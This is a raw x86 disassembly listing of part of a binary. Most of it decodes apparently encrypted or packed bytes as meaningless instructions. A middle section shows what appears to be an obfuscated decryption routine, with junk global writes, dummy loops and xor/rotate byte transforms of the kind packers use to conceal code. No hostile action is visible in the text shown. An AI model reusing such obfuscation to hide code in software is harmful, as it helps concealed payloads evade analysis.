  4038a1:	dec    esp
  4038a2:	dec    edx
  4038a3:	pop    ecx
  4038a4:	into   
  4038a5:	mov    esi,0xd9c54ff6
  4038aa:	xchg   ebx,eax
  4038ab:	and    eax,0xfbfb6421
  4038b0:	outs   dx,BYTE PTR ds:[esi]
  4038b1:	jp     0x4038f8
  4038b3:	repz inc ebp
  4038b5:	or     DWORD PTR [ecx],ebp
  4038b7:	add    ebx,DWORD PTR [eax-0x59]
  4038ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038bb:	cmove  esp,DWORD PTR [edi]
  4038be:	dec    eax
  4038bf:	out    0xd3,al
  4038c1:	stos   DWORD PTR es:[edi],eax
  4038c2:	lock jge 0x40393a
  4038c5:	push   ebx
  4038c6:	pop    eax
  4038c7:	or     al,0x6b
  4038c9:	gs (bad) 
  4038cb:	(bad)  
  4038cc:	loop   0x403905
  4038ce:	(bad)  
  4038cf:	jae    0x40385c
  4038d1:	pop    eax
  4038d2:	dec    ebp
  4038d3:	jmp    0x40394a
  4038d5:	stos   BYTE PTR es:[edi],al
  4038d6:	imul   esp,DWORD PTR [esi-0x22],0xa250b397
  4038dd:	adc    esp,ebx
  4038df:	nop
  4038e0:	xchg   esp,eax
  4038e1:	xchg   ecx,eax
  4038e2:	pop    esi
  4038e3:	dec    ebx
  4038e4:	cwde   
  4038e5:	dec    ebp
  4038e6:	(bad)  
  4038e8:	xor    BYTE PTR [ecx+esi*1],bl
  4038eb:	xchg   esp,eax
  4038ec:	std    
  4038ed:	adc    al,0xbc
  4038ef:	inc    ebx
  4038f0:	ja     0x40392c
  4038f2:	mov    al,ds:0x2c235f2f
  4038f7:	cdq    
  4038f8:	pop    esi
  4038f9:	neg    DWORD PTR [edx-0x68]
  4038fc:	sub    DWORD PTR [ebp+ebx*4-0x3d8cde17],0xffffff8b
  403904:	dec    ebp
  403905:	lock sub DWORD PTR ds:0x426eb9,0x426ea1
  403910:	xor    eax,esi
  403912:	adc    DWORD PTR ds:0x426f2d,0x426f05
  40391c:	xor    ecx,esi
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x42fa44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x42fa18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0xb1c4e32d,al
  403bc1:	imul   edi,DWORD PTR [ecx+0x3f],0xfffffff4
  403bc5:	pushf  
  403bc6:	jnp    0x403c43
  403bc8:	hlt    
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	pop    ebp
  403bcd:	mov    BYTE PTR [ecx+0x45bf153f],ah
  403bd3:	in     al,0xeb
  403bd5:	aaa    
  403bd6:	ins    BYTE PTR es:[edi],dx
  403bd7:	sahf   
  403bd8:	push   ebp
  403bd9:	pop    ebp
  403bda:	jae    0x403bc6
  403bdc:	push   ds
  403bdd:	add    eax,0x144adbdc
  403be2:	pop    esp
  403be3:	clc    
  403be4:	hlt    
  403be5:	fild   DWORD PTR [ecx+0x67295074]
  403beb:	mov    eax,ds:0x29fc3b22
  403bf0:	xchg   ebp,eax
  403bf1:	push   esp
  403bf2:	lock adc esi,esi
  403bf5:	mov    ebx,0xba73043f
  403bfa:	sub    BYTE PTR [ecx-0x1f09cf02],0xdf
  403c01:	xchg   edx,eax
  403c02:	jmp    0xa9bc:0x3aa563c0
  403c09:	inc    ebx
  403c0a:	ror    DWORD PTR [esi+eiz*2-0x58],cl
  403c0e:	jge    0xec137ed2
  403c14:	cld    
  403c15:	test   al,0x71
  403c17:	pop    esi
  403c18:	pop    edi
  403c19:	sbb    BYTE PTR [eax-0x4a],dl
  403c1c:	add    edx,0xbb699fc1
  403c22:	inc    esi
  403c23:	popf   
  403c24:	inc    ebp
  403c25:	mov    ah,0x7a
  403c27:	xor    BYTE PTR [bx-0x2b],ah
  403c2b:	sbb    edi,DWORD PTR [eax+0x274700d7]
  403c31:	push   ecx
  403c32:	bound  ecx,QWORD PTR [ecx-0xa]
  403c35:	xlat   BYTE PTR ds:[ebx]
  403c36:	sbb    dl,BYTE PTR ds:0x743c6140
  403c3c:	mov    ds:0x580b326f,eax
  403c41:	lock lock test al,0xcf
  403c45:	dec    edx
  403c46:	jo     0x403c92
  403c48:	icebp  
  403c49:	idiv   ebx
  403c4b:	xor    dl,BYTE PTR [ecx-0x51]
  403c4e:	ins    DWORD PTR es:[edi],dx
  403c4f:	in     al,0x3
  403c51:	rcr    DWORD PTR [eax+0x10],1
  403c54:	test   dl,ch
  403c56:	push   ebx
  403c57:	push   ecx
  403c58:	out    dx,al
  403c59:	scas   al,BYTE PTR es:[edi]
  403c5a:	adc    DWORD PTR [esi+0x21],edi
  403c5d:	icebp  
  403c5e:	inc    ebp
  403c5f:	jle    0x403cd4
  403c61:	cmp    BYTE PTR [edx+ebp*2],dh
  403c64:	sbb    dh,ah
  403c66:	jbe    0x403c6b
  403c68:	fwait
  403c69:	mov    al,ds:0x484fd196
  403c6e:	dec    esp
  403c6f:	daa    
  403c70:	rcr    BYTE PTR [ebx+0x54],0xe5
  403c74:	mov    fs,WORD PTR [ebp+0xe8e13df]
  403c7a:	inc    esi
  403c7b:	icebp  
  403c7c:	mov    dh,dl
  403c7e:	push   esp
  403c7f:	push   ds
  403c80:	mov    ebx,0x62711cb7
  403c85:	clc    
  403c86:	out    dx,eax
  403c87:	mov    esp,0xd64990ca
  403c8c:	outs   dx,DWORD PTR ds:[esi]
  403c8d:	push   ebp
  403c8e:	mov    eax,0xd83bdee9
  403c93:	push   esp
  403c94:	add    al,0xb9
  403c96:	sbb    eax,0x1e04a5f
  403c9b:	add    DWORD PTR [edi],edi
  403c9d:	push   ds
  403c9e:	int3   
  403c9f:	lock cmp DWORD PTR fs:[ebx+0x4045c9e],ebx
  403ca7:	fnstsw WORD PTR [ebx+0x69]
  403caa:	cwde   
  403cab:	cmp    dh,BYTE PTR [eax+0x1]
  403cae:	mov    eax,0xb086a9d3
  403cb3:	mov    ecx,esi
  403cb5:	push   ds
  403cb6:	jne    0x403cd6
  403cb8:	mov    DWORD PTR [esi+0x5d],edi
  403cbb:	push   0xffffffd8
  403cbd:	addr16 aaa 
  403cbf:	inc    ebp
  403cc0:	push   ds
  403cc1:	lds    ebx,FWORD PTR [ebx+edi*1+0x5698929b]
  403cc8:	mov    ch,0xc4
  403cca:	cs xor eax,0x10795301
  403cd0:	mov    ch,0x51
  403cd2:	sbb    dl,BYTE PTR [eax-0x56e6f049]
  403cd8:	sar    BYTE PTR [edi+eiz*1],1
  403cdb:	mov    al,0x47
  403cdd:	and    bh,BYTE PTR [ebp+edi*1+0x65d701e6]
  403ce4:	ret    0x517d
  403ce7:	dec    eax
  403ce8:	jns    0x403ceb
  403cea:	xlat   BYTE PTR ds:[ebx]
  403ceb:	or     al,0xc8
  403ced:	jmp    0x5cb7:0xb2ee6975
  403cf4:	inc    eax
  403cf5:	mov    edi,0x1e65f40
  403cfa:	out    dx,eax
  403cfb:	cdq    
  403cfc:	mov    al,ds:0xb735eea2
  403d01:	loopne 0x403c8c
  403d03:	xor    al,0x2d
  403d05:	push   ss
  403d06:	ret    0xae9e
  403d09:	mov    dh,0x2f
  403d0b:	pop    eax
  403d0c:	lods   al,BYTE PTR ds:[esi]
  403d0d:	or     ecx,DWORD PTR [ebx+0x3a5a6571]
  403d13:	pop    esp
  403d14:	arpl   dx,sp
  403d16:	lods   eax,DWORD PTR ds:[esi]
  403d17:	xchg   BYTE PTR [ebp+0x1c576aa9],bh
  403d1d:	test   BYTE PTR [ebx],dl
  403d1f:	or     al,0x4
  403d21:	pushf  
  403d22:	sbb    edi,DWORD PTR [esi+0x372f8b2f]
  403d28:	fcom   QWORD PTR [ecx]
  403d2a:	xchg   BYTE PTR [eax],dl
  403d2c:	test   eax,0xbd3bafff
  403d31:	std    
  403d32:	xor    edi,DWORD PTR [ecx-0x5f]
  403d35:	add    BYTE PTR [esi+0x3a],0xd9
  403d39:	mov    eax,0x10cd2064
  403d3e:	add    bl,BYTE PTR [ebx-0x2c]
  403d41:	add    BYTE PTR [edx],0xdb
  403d44:	imul   esi,DWORD PTR [ebx],0x18
  403d47:	rcl    BYTE PTR [esi-0x42],0xc2
  403d4b:	ds dec edx
  403d4d:	mov    dh,0x3
  403d4f:	push   ebx
  403d50:	jecxz  0x403d04
  403d52:	(bad)  
  403d54:	(bad)  
  403d57:	xchg   esi,eax
  403d58:	and    dh,BYTE PTR [ecx+0x26]
  403d5b:	inc    ebp
  403d5c:	push   esi
  403d5d:	ss xchg ecx,eax
  403d5f:	push   esp
  403d60:	pop    edx
  403d61:	sub    eax,eax
  403d63:	jo     0x403d5e
  403d65:	pop    eax
  403d66:	jae    0x403d6b
  403d68:	xchg   esp,eax
  403d69:	mov    eax,0x17f68da4
  403d6e:	repnz inc eax
  403d70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d71:	scas   eax,DWORD PTR es:[edi]
  403d72:	pushf  
  403d73:	cwde   
  403d74:	mov    ebp,0x84216684
  403d79:	adc    ah,BYTE PTR [ebp-0x710e66b4]
  403d7f:	stc    
  403d80:	jae    0x403da1
  403d82:	lock or ebp,ecx
  403d85:	cmp    DWORD PTR [edx+0x1ee90410],edx
  403d8b:	xchg   esp,eax
  403d8c:	mov    esi,0xb8f85ad9
  403d91:	mov    edx,0xccf7bc08
  403d96:	cdq    
  403d97:	push   ds
  403d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d99:	jg     0x403d35
  403d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d9c:	jbe    0x403e10
  403d9e:	dec    ebp
  403d9f:	xor    DWORD PTR [ebp+0x60],eax
  403da2:	cmc    
  403da3:	or     dl,ch
  403da5:	xchg   edi,eax
  403da6:	and    al,0x34
  403da8:	mov    BYTE PTR [ebp+ebp*8+0x560c1917],al
  403daf:	push   0x4fd29787
  403db4:	call   0xe5e8166b
  403db9:	aaa    
  403dba:	xchg   ah,bh
  403dbc:	mov    ebx,es
  403dbe:	sbb    eax,0x2c2b65a2
  403dc3:	sti    
  403dc4:	cwde   
  403dc5:	or     dl,cl
  403dc7:	cmp    eax,0x549e43e5
  403dcc:	std    
  403dcd:	adc    eax,0x5ed32665
  403dd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dd3:	pop    esp
  403dd4:	push   edi
  403dd5:	pusha  
  403dd6:	iret   
  403dd7:	(bad)  
  403dd8:	cmp    DWORD PTR [ebx-0x75a17e96],ebx
  403dde:	test   al,0x40
  403de0:	imul   edi,ebp,0x8f9842c7
  403de6:	out    0x6,al
  403de8:	mov    edi,0xda1a39c9
  403ded:	dec    edi
  403dee:	mov    BYTE PTR [edi-0x6b8ba6af],bl
  403df4:	fist   WORD PTR [ecx+edi*2+0x2837656e]
  403dfb:	sbb    al,0x17
  403dfd:	sbb    bl,BYTE PTR [esi+0x6]
  403e00:	pop    ss
  403e01:	in     al,0x74
  403e03:	xlat   BYTE PTR ds:[ebx]
  403e04:	or     edi,ebx
  403e06:	scas   al,BYTE PTR es:[edi]
  403e07:	add    DWORD PTR [ebx],ebp
  403e09:	pop    edx
  403e0a:	jb     0x403e68
  403e0c:	aaa    
  403e0d:	shr    DWORD PTR [eax],1
  403e0f:	test   al,0x5a
  403e11:	jns    0x403d94
  403e13:	shr    BYTE PTR [ecx+0x5e],0x30
  403e17:	nop
  403e18:	cld    
  403e19:	or     cl,BYTE PTR [ecx+0xc]
  403e1c:	jmp    0xd599:0x4b67c492
  403e23:	jmp    0x54b62486
  403e28:	into   
  403e29:	(bad)  
  403e2a:	daa    
  403e2b:	pop    esp
  403e2c:	mov    al,ds:0xd12b690e
  403e31:	dec    ebp
  403e32:	in     al,0xcc
  403e34:	loope  0x403e4d
  403e36:	dec    ebp
  403e37:	mov    dh,0x94
  403e39:	and    bh,BYTE PTR [ebx-0x4fbbe808]
  403e3f:	mov    fs,WORD PTR [ecx+0x74]
  403e42:	ja     0x403dfb
  403e44:	push   ss
  403e45:	not    dh
  403e47:	mov    ds:0x1072279b,eax
  403e4c:	hlt    
  403e4d:	std    
  403e4e:	stc    
  403e4f:	xchg   ebx,eax
  403e50:	mov    ebp,0x67a0c1fb
  403e55:	jmp    0xabe65171
  403e5a:	fisttp WORD PTR [edi]
  403e5c:	(bad)  
  403e5d:	jmp    0xfe0cf1ff
  403e62:	push   esi
  403e63:	and    ah,BYTE PTR [edi]
  403e65:	bound  ebp,QWORD PTR [ebx+0x4b]
  403e68:	xchg   esi,eax
  403e69:	mov    eax,0x4bd08876
  403e6e:	mov    bl,0xf
  403e70:	fcmovnb st,st(2)
  403e72:	pusha  
  403e73:	call   0xb9283efd
  403e78:	jo     0x403ea9
  403e7a:	and    al,0xc7
  403e7c:	dec    ecx
  403e7d:	and    eax,0x59f2a65c
  403e82:	ficomp DWORD PTR [eax-0x3]
  403e85:	(bad)
  403e88:	jmp    0xa0222351
  403e8d:	mov    esp,0xe6e89631
  403e92:	mov    ah,0x3d
  403e94:	and    eax,0xceca4ad
  403e99:	pop    esi
  403e9a:	jne    0x403e1f
  403e9c:	pop    ecx
  403e9d:	mov    ds:0xda646a92,al
  403ea2:	mov    ebx,0x2ac14264
  403ea7:	jp     0x403ed5
  403ea9:	xchg   ecx,eax
  403eaa:	mov    edi,DWORD PTR [esi-0x619c615c]
  403eb0:	sub    DWORD PTR [ebx],edi
  403eb2:	mov    ?,ebx
  403eb4:	test   DWORD PTR [esi-0x5a],eax
  403eb7:	dec    ebp
  403eb8:	fdivr  QWORD PTR [ebp-0x10]
  403ebb:	imul   ebx,DWORD PTR [esi-0x7b],0x398af81c
  403ec2:	add    al,0xb9
  403ec4:	sub    esi,ecx
  403ec6:	pop    ebp
  403ec7:	xor    ebp,DWORD PTR [eax-0x314305e3]
  403ecd:	pop    es
  403ece:	adc    DWORD PTR [ebx],ecx
  403ed0:	leave  
  403ed1:	push   ecx
  403ed2:	repz pusha 
  403ed4:	adc    DWORD PTR [eax],esp
  403ed6:	add    dl,BYTE PTR [edi-0x4de2e6fa]
  403edc:	sbb    DWORD PTR [ecx],edx
  403ede:	loope  0x403ede
  403ee0:	gs aaa 
  403ee2:	test   al,0xfc
  403ee4:	(bad)  
  403ee5:	je     0x403ed0
  403ee7:	add    DWORD PTR [ecx+esi*2-0x11],edx
  403eeb:	leave  
  403eec:	aad    0x25
  403eee:	add    DWORD PTR [edx],edi
  403ef0:	mov    cl,0x2d
  403ef2:	mov    ebx,0x64700b4
  403ef7:	mov    ecx,0x92849866
  403efc:	pop    ecx
  403efd:	out    0x26,eax
  403eff:	or     BYTE PTR [ebp-0xe93b115],0xe2
  403f06:	jb     0x403f09
  403f08:	inc    esp
  403f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f0a:	addr16 jmp 0xc9e8953b
  403f10:	mov    al,0x59
  403f12:	sub    edx,esp
  403f14:	xlat   BYTE PTR ds:[ebx]
  403f15:	jb     0x403f7d
  403f17:	push   ebp
  403f18:	(bad)  
  403f19:	pop    edx
  403f1a:	idiv   BYTE PTR [ecx+0x63]
  403f1d:	push   edx
  403f1e:	mov    cl,0x9c
  403f20:	cmp    ebp,DWORD PTR [eax+0x47]
  403f23:	dec    esi
  403f24:	add    edi,eax
  403f26:	and    eax,edx
  403f28:	mov    bh,0xfe
  403f2a:	sbb    ebp,DWORD PTR [eax-0x23]
  403f2d:	cli    
  403f2e:	sbb    BYTE PTR [ecx+0x3bd9e45b],dh
  403f34:	aas    
  403f35:	test   al,0x5
  403f37:	cmp    al,0x76
  403f39:	sub    DWORD PTR [edi+0x2e404b4],edx
  403f3f:	add    BYTE PTR [ecx-0x2390f8ab],ch
  403f45:	xchg   esp,eax
  403f46:	sbb    ecx,ebx
  403f48:	std    
  403f49:	out    0x5b,al
  403f4b:	mov    cl,0xdd
  403f4d:	cbw    
  403f4f:	pop    eax
  403f51:	and    ebx,ebx
  403f53:	stc    
  403f54:	mov    dh,0xa1
  403f56:	dec    esp
  403f57:	aam    0x34
  403f59:	cmp    DWORD PTR [eax],0xacec3b89
  403f5f:	mov    dl,0x24
  403f61:	mov    ds:0x518d63e9,eax
  403f66:	aaa    
  403f67:	add    bl,dl
  403f69:	sbb    DWORD PTR [edx],eax
  403f6b:	sar    BYTE PTR [esi],1
  403f6d:	xchg   BYTE PTR [esi],ah
  403f6f:	(bad)
  403f73:	ins    DWORD PTR es:[edi],dx
  403f74:	mov    dl,BYTE PTR [eax-0x751deb24]
  403f7a:	mov    edx,0xc59d0f91
  403f7f:	push   es
  403f80:	add    dl,BYTE PTR [esi+0x63]
  403f83:	rol    BYTE PTR [esi+ebx*2],1
  403f86:	or     eax,ebx
  403f88:	mov    bh,0xdc
  403f8a:	push   0x57
  403f8c:	inc    edx
  403f8d:	ins    BYTE PTR es:[edi],dx
  403f8e:	das    
  403f8f:	cwde   
  403f90:	in     al,0x35
  403f92:	in     al,dx
  403f93:	ins    DWORD PTR es:[edi],dx
  403f94:	enter  0xde36,0x86
  403f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f99:	cmp    al,0xc6
  403f9b:	(bad)  
  403f9d:	shr    DWORD PTR [eax],1
  403f9f:	dec    edi
  403fa0:	xor    eax,0x7e5f309b
  403fa5:	jae    0x403fdb
  403fa7:	nop
  403fa8:	cwde   
  403fa9:	jle    0x403fe5
  403fab:	pusha  
  403fac:	retf   0xa894
  403faf:	repnz push es
  403fb1:	xchg   dh,cl
  403fb3:	mov    cl,0xd
  403fb5:	pop    ds
  403fb6:	jnp    0x404015
  403fb8:	lods   al,BYTE PTR ds:[esi]
  403fb9:	jge    0x404036
  403fbb:	into   
  403fbc:	adc    BYTE PTR [ecx-0x74],0x77
  403fc0:	mov    esi,0xa0eab596
  403fc5:	test   BYTE PTR [eax+0xb37a322],dh
  403fcb:	pop    edi
  403fcc:	adc    ah,dl
  403fce:	rcl    BYTE PTR [ebp+0x51],1
  403fd1:	or     eax,0x19b9f453
  403fd6:	mov    dl,0x94
  403fd8:	dec    ecx
  403fd9:	push   ds
  403fda:	pop    esi
  403fdb:	(bad)  
  403fdc:	(bad)  
  403fdd:	sub    ch,BYTE PTR [eax+0x3f6d9ab4]
  403fe3:	repz loop 0x403fa3
  403fe6:	push   ebp
  403fe7:	jb     0x403fad
  403fe9:	inc    eax
  403fea:	(bad)  [edx+0x56]
  403fed:	addr16 mov esi,0xf647e9f5
  403ff3:	popf   
  403ff4:	and    BYTE PTR [esp+esi*8+0x5d38ffbb],0x72
  403ffc:	retf   
  403ffd:	ret    0x58e
  404000:	loop   0x403fa1
  404002:	xchg   ecx,eax
  404003:	out    dx,eax
  404004:	aaa    
  404005:	in     al,dx
  404006:	imul   eax,DWORD PTR [edx],0xf9861abf
  40400c:	xchg   esi,eax
  40400d:	mov    eax,ds:0xc48795cf
  404012:	cmp    dl,BYTE PTR [ecx-0x3b328add]
  404018:	pop    eax
  404019:	(bad)  
  40401a:	std    
  40401b:	ja     0x404024
  40401d:	push   ds
  40401e:	test   BYTE PTR [edx+0x710581d2],bh
  404024:	pop    ecx
  404025:	adc    eax,0xe2ad3d7a
  40402a:	mov    ebx,0x4d115651
  40402f:	jmp    0x52a03e9e
  404034:	sbb    eax,0x796f9c6a
  404039:	mov    al,0xfc
  40403b:	sbb    eax,0xc28e4947
  404040:	dec    ecx
  404041:	pop    es
  404042:	dec    esi
  404043:	sub    cl,bl
  404045:	loop   0x40409f
  404047:	jbe    0x404037
  404049:	scas   eax,DWORD PTR es:[edi]
  40404a:	push   edi
  40404b:	push   edx
  40404c:	inc    esi
  40404d:	mov    ebx,0x8d7e7ac4
  404052:	push   esp
  404053:	call   0x7505f253
  404058:	cmp    dl,BYTE PTR [edi+0x52763c71]
  40405e:	out    0x29,eax
  404060:	bound  ebx,QWORD PTR [edx]
  404062:	add    BYTE PTR [edx],0xf5
  404065:	repz stc 
  404067:	dec    ebp
  404068:	dec    eax
  404069:	sar    BYTE PTR [esi],0x4e
  40406c:	sbb    bh,0x8e
  40406f:	inc    ebp
  404070:	cld    
  404071:	jmp    0x43f603a
  404076:	adc    DWORD PTR [eax-0x4b],esi
  404079:	inc    ecx
  40407a:	mov    ds:0xee76b7e8,al
  40407f:	push   edi
  404080:	xchg   edi,eax
  404081:	popa   
  404082:	mov    edx,0x622beba1
  404087:	retf   0xd278
  40408a:	adc    DWORD PTR [edi-0x2d8322b6],0xfffffffa
  404091:	popa   
  404092:	cmp    BYTE PTR [ecx],cl
  404094:	adc    BYTE PTR [ebp+0x1f],al
  404097:	aaa    
  404098:	scas   al,BYTE PTR es:[edi]
  404099:	(bad)  
  40409a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40409b:	clc    
  40409c:	je     0x4040e5
  40409e:	dec    ecx
  40409f:	mov    edi,0x18eb79e7
  4040a4:	jl     0x404051
  4040a6:	ins    BYTE PTR es:[edi],dx
  4040a7:	sbb    eax,DWORD PTR [ecx]
  4040a9:	mov    ah,BYTE PTR [ebx+0x56d3f02f]
  4040af:	loope  0x404037
  4040b1:	imul   ecx,DWORD PTR [eax-0x12],0xffffffe3
  4040b5:	jg     0x40405c
  4040b7:	icebp  
  4040b8:	shl    DWORD PTR ds:0x796b5b32,0xb3
  4040bf:	jle    0x4040b2
  4040c1:	test   al,0xa0
  4040c3:	aas    
  4040c4:	xor    esi,ecx
  4040c6:	jmp    0xa01d2dd1
  4040cb:	arpl   WORD PTR [ecx],bp
  4040cd:	dec    edx
  4040ce:	sbb    eax,0xed8a0bc9
  4040d3:	mov    eax,0xeca342e5
  4040d8:	icebp  
  4040d9:	cdq    
  4040da:	lods   al,BYTE PTR ds:[esi]
  4040db:	add    dh,BYTE PTR [esi+0x6c]
  4040de:	and    cl,bl
  4040e0:	repnz into 
  4040e2:	inc    ebx
  4040e3:	push   edx
  4040e4:	pop    es
  4040e5:	dec    ebx
  4040e6:	mov    al,0xec
  4040e8:	fadd   QWORD PTR [esi-0x4ddfc219]
  4040ee:	and    bh,cl
  4040f0:	aas    
  4040f1:	rcl    DWORD PTR [eax+0x7a],1
  4040f4:	push   0xffffff86
  4040f6:	and    eax,DWORD PTR [eax-0x18]
  4040f9:	xchg   esp,eax
  4040fa:	in     eax,dx
  4040fb:	cs ret 0x952d
  4040ff:	add    eax,0x37d69ca9
  404104:	and    edi,DWORD PTR ds:0xdaf9e5d
  40410a:	sahf   
  40410b:	push   ecx
  40410c:	aas    
  40410d:	xchg   ebp,eax
  40410e:	push   WORD PTR [edx+ecx*4]
  404112:	push   0xffffffe2
  404114:	cmp    al,al
  404116:	jg     0x40409f
  404118:	data16 lods al,BYTE PTR ds:[esi]
  40411a:	idiv   DWORD PTR [ebx+0x2903c5f5]
  404120:	pop    ecx
  404121:	mov    eax,0xc2c120c
  404126:	clc    
  404127:	dec    esi
  404128:	mov    ebx,0xdeae2f2b
  40412d:	pop    ebx
  40412e:	mov    bl,BYTE PTR [esi]
  404130:	inc    esi
  404131:	add    BYTE PTR [ebx],bl
  404133:	pop    eax
  404134:	pop    ebx
  404135:	inc    edx
  404136:	push   edi
  404137:	push   ss
  404138:	mov    ebx,0x854dd568
  40413d:	(bad)  
  40413e:	pop    edi
  40413f:	enter  0xf1f8,0x37
  404143:	fdivrp st(3),st
  404145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
